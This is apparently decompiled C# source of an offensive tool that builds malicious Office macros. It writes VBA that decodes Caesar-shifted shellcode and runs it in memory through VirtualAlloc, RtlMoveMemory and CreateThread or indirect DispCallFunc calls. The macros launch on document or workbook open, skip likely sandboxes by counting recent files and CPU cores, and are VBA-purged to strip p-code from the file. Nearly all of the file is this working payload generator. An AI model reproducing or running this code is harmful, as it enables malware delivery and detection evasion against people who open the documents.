using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using NDesk.Options;
using OpenMcdf;

namespace BirdBrainmofo
{
	// Token: 0x0200003A RID: 58
	public class IcarusW
	{
		// Token: 0x06000217 RID: 535 RVA: 0x000138BC File Offset: 0x00011ABC
		public static void Import_Statements(string shellcode)
		{
			if (shellcode == "classic")
			{
				WriteFile("Private Declare PtrSafe Function CreateThread Lib \"KERNEL32\"(ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr\n");
				WriteFile("Private Declare PtrSafe Function VirtualAlloc Lib \"KERNEL32\"(ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr\n");
				WriteFile("Private Declare PtrSafe Function RtlMoveMemory Lib \"KERNEL32\"(ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr\n");
			}
			else if (shellcode == "indirect")
			{
				WriteFile("Declare PtrSafe Function DispCallFunc Lib \"OleAut32.dll\"(ByVal pvInstance As Long, ByVal offsetinVft As Long, ByVal CallConv As Long, ByVal retTYP As Integer, ByVal paCNT As Long, ByRef paTypes As Integer, ByRef paValues As Long, ByRef retVAR As Variant) As Long\n");
				WriteFile("Declare PtrSafe Function LoadLibrary Lib \"kernel32\" Alias \"LoadLibraryA\"(ByVal lpLibFileName As String) As Long\n");
				WriteFile("Declare PtrSafe Function GetProcAddress Lib \"kernel32\"(ByVal hModule As Long, ByVal lpProcName As String) As Long\n");
			}
		}

		// Token: 0x06000218 RID: 536 RVA: 0x000075BE File Offset: 0x000057BE
		public static void Constant(string shellcode)
		{
			if (shellcode == "indirect")
			{
				WriteFile("Const CC_STDCALL = 4\n");
				WriteFile("Const MEM_COMMIT = &H1000\n");
				WriteFile("Const PAGE_EXECUTE_READWRITE = &H40\n");
				WriteFile("Private VType(0 To 63) As Integer, VPtr(0 To 63) As Long\n");
			}
		}

		// Token: 0x06000219 RID: 537 RVA: 0x00013924 File Offset: 0x00011B24
		public static void Malicious(string shellcode)
		{
			if (shellcode == "classic")
			{
				WriteFile("Function " + string_0[0] + "()\n");
				WriteFile(Declare_variable(string_0[1], "Variant\n"));
				WriteFile(Declare_variable(string_0[2], "LongPtr\n"));
				WriteFile(Declare_variable(string_0[3], "Long\n"));
				WriteFile(Declare_variable(string_0[4], "Long\n"));
				WriteFile(Declare_variable(string_0[5], "LongPtr\n"));
			}
			else if (shellcode == "indirect")
			{
				WriteFile("Function " + string_0[0] + "()\n");
				WriteFile(Declare_variable(string_0[1], "Long\n"));
				WriteFile(Declare_variable(string_0[2], "Long\n"));
			}
		}

		// Token: 0x0600021A RID: 538 RVA: 0x00013A20 File Offset: 0x00011C20
		public static void FunctionCalls(string shellcode)
		{
			if (shellcode == "classic")
			{
				WriteFile(string_0[2] + " = VirtualAlloc(0, UBound(" + string_0[1] + "), &H3000, &H40)\n");
				WriteFile(string.Concat("For ", string_0[3], " = LBound(", string_0[1], ") To UBound(", string_0[1], ")\n"));
				WriteFile(string.Concat(string_0[4], " = ", string_0[1], "(", string_0[3], ")\n"));
				WriteFile(string.Concat(string_0[5], "= RtlMoveMemory(", string_0[2], " + ", string_0[3], ",", string_0[4], ", 1)\n"));
				WriteFile("Next " + string_0[3] + "\n");
				WriteFile("res = CreateThread(0, 0, " + string_0[2] + ", 0, 0, 0)\n");
				WriteFile("End Function\n");
			}
			else if (shellcode == "indirect")
			{
				WriteFile(string_0[1] + " = stdCallA(\"kernel32\", \"VirtualAlloc\", vbLong, 0&, UBound(" + string_0[3] + "), MEM_COMMIT, PAGE_EXECUTE_READWRITE)\n");
				WriteFile(string.Concat("For ", string_0[4], " = LBound(", string_0[3], ") To UBound(", string_0[3], ")\n"));
				WriteFile(string.Concat(string_0[5], " = ", string_0[3], "(", string_0[4], ")\n"));
				WriteFile(string.Concat(string_0[2], " = stdCallA(\"kernel32\", \"RtlMoveMemory\", vbLong, ", string_0[1], "+", string_0[4], ", ", string_0[5], ", 1)\n"));
				WriteFile("Next " + string_0[4] + "\n");
				WriteFile(string_0[2] + " = stdCallA(\"kernel32\", \"CreateThread\", vbLong, 0&, 0&, " + string_0[1] + ", 0&, 0&, 0&)\n");
				WriteFile("End Function\n\n\n");
				WriteFile("Public Function stdCallA(sDll As String, sFunc As String, ByVal RetType As VbVarType, ParamArray P() As Variant)\n");
				WriteFile("Dim i As Long, pFunc As Long, V(), HRes As Long\n");
				WriteFile("ReDim V(0)\n");
				WriteFile("V = P\n");
				WriteFile("For i = 0 To UBound(V)\n");
				WriteFile("If VarType(P(i)) = vbString Then P(i) = StrConv(P(i), vbFromUnicode): V(i) = StrPtr(P(i))\n");
				WriteFile("VType(i) = VarType(V(i))\n");
				WriteFile("VPtr(i) = VarPtr(V(i))\n");
				WriteFile("Next i\n");
				WriteFile("HRes = DispCallFunc(0, GetProcAddress(LoadLibrary(sDll), sFunc), CC_STDCALL, RetType, i, VType(0), VPtr(0), stdCallA)\n");
				WriteFile("End Function\n");
			}
		}

		// Token: 0x0600021B RID: 539 RVA: 0x00013D64 File Offset: 0x00011F64
		public static string Declare_variable(string var1, string var2)
		{
			return " Dim " + var1 + " As " + var2;
		}

		// Token: 0x0600021C RID: 540 RVA: 0x00013D84 File Offset: 0x00011F84
		public static void WriteFile(string str)
		{
			byte[] bytes = new UTF8Encoding(true).GetBytes(str);
			fileStream_0.Write(bytes, 0, bytes.Length);
		}

		// Token: 0x0600021D RID: 541 RVA: 0x00013DB0 File Offset: 0x00011FB0
		internal static string CreateString(int stringLength)
		{
			char[] array = new char[stringLength];
			for (int i = 0; i < stringLength; i++)
			{
				array[i] = "ABCDEFGHJKLMNOPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"[random_0.Next(0, 50)];
			}
			return new string(array);
		}

		// Token: 0x0600021E RID: 542 RVA: 0x000075F5 File Offset: 0x000057F5
		public static void ShowHelp(OptionSet optionSet_0)
		{
			Console.WriteLine("Usage:");
			optionSet_0.WriteOptionDescriptions(Console.Out);
		}

		// Token: 0x0600021F RID: 543 RVA: 0x00013DF8 File Offset: 0x00011FF8
		public static void Create(string bin, string outfile, int caesar, string document, string _purge)
		{
			string text = bin;
			string text2 = "classic";
			bool flag = false;
			try
			{
				if (_purge.Contains("no"))
				{
					fileStream_0 = File.Create(outfile);
					for (int i = 0; i < 20; i++)
					{
						string_0[i] = CreateString(3);
					}
					Import_Statements(shellcodeexec);
					Constant(shellcodeexec);
					Malicious(shellcodeexec);
					Sandboxingdetection(shellcodeexec);
					Encrypt(File.ReadAllBytes(text), shellcodeexec);
					Decrypt(shellcodeexec);
					FunctionCalls(shellcodeexec);
					if (!(document == "excel"))
					{
						if (document == "doc")
						{
							Docopen();
						}
					}
					else
					{
						Workbookopen();
					}
					Auto_open(document);
					fileStream_0.Dispose();
				}
				if (_purge.Contains("yes"))
				{
					try
					{
						if (!flag)
						{
							string outFilename = Utils.GetOutFilename(outfile);
							if (File.Exists(outFilename))
							{
								File.Delete(outFilename);
							}
							File.Copy(text, outFilename);
							text = outFilename;
						}
						CompoundFile compoundFile = new CompoundFile(text, CFSUpdateMode.Update, 0);
						CFStorage cfstorage = compoundFile.RootStorage;
						if (document == "doc")
						{
							cfstorage = compoundFile.RootStorage.GetStorage("Macros");
						}
						else if (document == "excel")
						{
							cfstorage = compoundFile.RootStorage.GetStorage("_VBA_PROJECT_CUR");
						}
						byte[] array = Utils.Decompress(cfstorage.GetStorage("VBA").GetStream("dir").GetData());
						List<Utils.ModuleInformation> list = Utils.ParseModulesFromDirStream(array);
						if (flag)
						{
							int num = 0;
							foreach (Utils.ModuleInformation moduleInformation in list)
							{
								num = num++;
								Console.WriteLine("\n[+] Module name " + num + ": " + moduleInformation.moduleName);
							}
						}
						else
						{
							bool flag2 = false;
							foreach (Utils.ModuleInformation moduleInformation2 in list)
							{
								if (moduleInformation2.moduleName == text2)
								{
									Console.WriteLine("\n[+] Target module name: " + moduleInformation2.moduleName);
									byte[] array2 = cfstorage.GetStorage("VBA").GetStream(moduleInformation2.moduleName).GetData();
									string vbatextFromModuleStream = Utils.GetVBATextFromModuleStream(array2, moduleInformation2.textOffset);
									array2 = Utils.RemovePcodeInModuleStream(array2, moduleInformation2.textOffset, vbatextFromModuleStream);
									cfstorage.GetStorage("VBA").GetStream(moduleInformation2.moduleName).SetData(array2);
									flag2 = true;
								}
							}
							if (!flag2)
							{
								Console.WriteLine("\n[!] Cannot find module inside target document (-m).\nList all module streams with (-l).\n");
								compoundFile.Commit();
								compoundFile.Close();
								CompoundFile.ShrinkCompoundFile(text);
								File.Delete(text);
							}
							else
							{
								cfstorage.GetStorage("VBA").GetStream("dir").SetData(Utils.Compress(Utils.ChangeOffset(array)));
								byte[] array3 = Utils.HexToByte("CC-61-FF-FF-00-00-00");
								cfstorage.GetStorage("VBA").GetStream("_VBA_PROJECT").SetData(array3);
								try
								{
									cfstorage.GetStorage("VBA").Delete("__SRP_0");
									cfstorage.GetStorage("VBA").Delete("__SRP_1");
									cfstorage.GetStorage("VBA").Delete("__SRP_2");
									cfstorage.GetStorage("VBA").Delete("__SRP_3");
								}
								catch (Exception)
								{
									Console.WriteLine("\n[*] No SRP streams found.");
								}
								compoundFile.Commit();
								compoundFile.Close();
								CompoundFile.ShrinkCompoundFile(text);
								Console.WriteLine("\n[+] VBA Purging completed successfully!\n");
							}
						}
					}
					catch (FileNotFoundException ex) when (ex.Message.Contains("Could not find file"))
					{
						Console.WriteLine("\n[!] Could not find path or file (-f). \n");
					}
					catch (CFItemNotFound cfitemNotFound) when (cfitemNotFound.Message.Contains("Cannot find item"))
					{
						Console.WriteLine("\n[!] File (-f) does not match document type selected (-d).\n");
					}
					catch (CFFileFormatException)
					{
						Console.WriteLine("\n[!] Incorrect filetype (-f). Must be an OLE strucutred file. OfficePurge supports .doc, .xls, or .pub documents.\n");
					}
				}
			}
			catch (Exception ex2)
			{
				Console.Error.WriteLine(ex2.Message);
			}
		}

		// Token: 0x06000220 RID: 544 RVA: 0x000142F0 File Offset: 0x000124F0
		public static void Sandboxingdetection(string shellcodeexec)
		{
			if (shellcodeexec == "classic")
			{
				WriteFile(" If Application.RecentFiles.Count < 3 Then\n");
				WriteFile("Exit Function\n");
				WriteFile("End if\n");
				WriteFile("Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")\n");
				WriteFile("Set colItems = objWMIService.ExecQuery(\"Select * from Win32_Processor\", , 48)\n");
				WriteFile("For Each objItem In colItems\n");
				WriteFile("If objItem.NumberOfCores < 3 Then\n");
				WriteFile("Exit Function\n");
				WriteFile("End If\n");
				WriteFile("Next\n");
			}
		}

		// Token: 0x06000221 RID: 545 RVA: 0x00014370 File Offset: 0x00012570
		public static void Decrypt(string shellcode)
		{
			if (shellcode == "classic")
			{
				WriteFile("For i = 0 To UBound(" + string_0[1] + ")\n");
				WriteFile(string.Concat(string_0[1], "(i) = ", string_0[1], "(i) - ", caesar.ToString(), "\n"));
				WriteFile("Next i\n");
			}
		}

		// Token: 0x06000222 RID: 546 RVA: 0x0000760C File Offset: 0x0000580C
		public static void Docopen()
		{
			WriteFile("Sub Document_Open()\n");
			WriteFile(string_0[0] + "\n");
			WriteFile("End Sub\n");
		}

		// Token: 0x06000223 RID: 547 RVA: 0x00007638 File Offset: 0x00005838
		public static void Workbookopen()
		{
			WriteFile("Sub Workbook_Open()\n");
			WriteFile(string_0[0] + "\n");
			WriteFile("End Sub\n");
		}

		// Token: 0x06000224 RID: 548 RVA: 0x000143F8 File Offset: 0x000125F8
		public static void Auto_open(string type)
		{
			if (type == "doc")
			{
				WriteFile("Sub AutoOpen()\n");
				WriteFile(string_0[0] + "\n");
				WriteFile("End Sub\n");
			}
			else if (type == "excel")
			{
				WriteFile("Sub Auto_Open()\n");
				WriteFile(string_0[0] + "\n");
				WriteFile("End Sub\n");
			}
		}

		// Token: 0x06000225 RID: 549 RVA: 0x00014478 File Offset: 0x00012678
		public static void Encrypt(byte[] bytes, string shellcode)
		{
			if (shellcode == "classic")
			{
				StringBuilder stringBuilder = new StringBuilder("");
				uint num = 0U;
				foreach (byte b in bytes)
				{
					stringBuilder.AppendFormat("{0:D}, ", (long)(b + (ulong)caesar));
					num += 1U;
					if (num % 50U == 0U)
					{
						stringBuilder.AppendFormat("_{0}", Environment.NewLine);
					}
				}
				string text = stringBuilder.ToString();
				if (bytes.Length % 50 == 0)
				{
					text = text.Substring(0, text.Length - 5);
				}
				else
				{
					text = text.Substring(0, text.Length - 2);
				}
				byte[] bytes2 = new UTF8Encoding(true).GetBytes(string.Concat(" ", string_0[1], " = Array(", text, ")\n"));
				fileStream_0.Write(bytes2, 0, bytes2.Length);
			}
			else if (shellcode == "indirect")
			{
				StringBuilder stringBuilder2 = new StringBuilder("");
				uint num2 = 0U;
				foreach (byte b2 in bytes)
				{
					stringBuilder2.AppendFormat("Chr(&H{0:X}), ", (uint)b2);
					num2 += 1U;
					if (num2 % 30U == 0U)
					{
						stringBuilder2.AppendFormat("_{0}", Environment.NewLine);
					}
				}
				string text2 = stringBuilder2.ToString();
				if (bytes.Length % 30 == 0)
				{
					text2 = text2.Substring(0, text2.Length - 5);
				}
				else
				{
					text2 = text2.Substring(0, text2.Length - 2);
				}
				byte[] bytes3 = new UTF8Encoding(true).GetBytes(string.Concat(" ", string_0[3], " = Array(", text2, ")\n\n"));
				fileStream_0.Write(bytes3, 0, bytes3.Length);
			}
		}

		// Token: 0x06000226 RID: 550 RVA: 0x00006F52 File Offset: 0x00005152

        // Token: 0x06000227 RID: 551 RVA: 0x00007664 File Offset: 0x00005864
		// Note: this type is marked as 'beforefieldinit'.
		static IcarusW()
		{
		}

		// Token: 0x04000176 RID: 374
		private static FileStream fileStream_0;

		// Token: 0x04000177 RID: 375
		private static string[] string_0 = new string[20];

		// Token: 0x04000178 RID: 376
		private static Random random_0 = new Random();

		// Token: 0x04000179 RID: 377
		private static string shellcodeexec = "classic";

		// Token: 0x0400017A RID: 378
		private static int caesar = 5;
	}
}
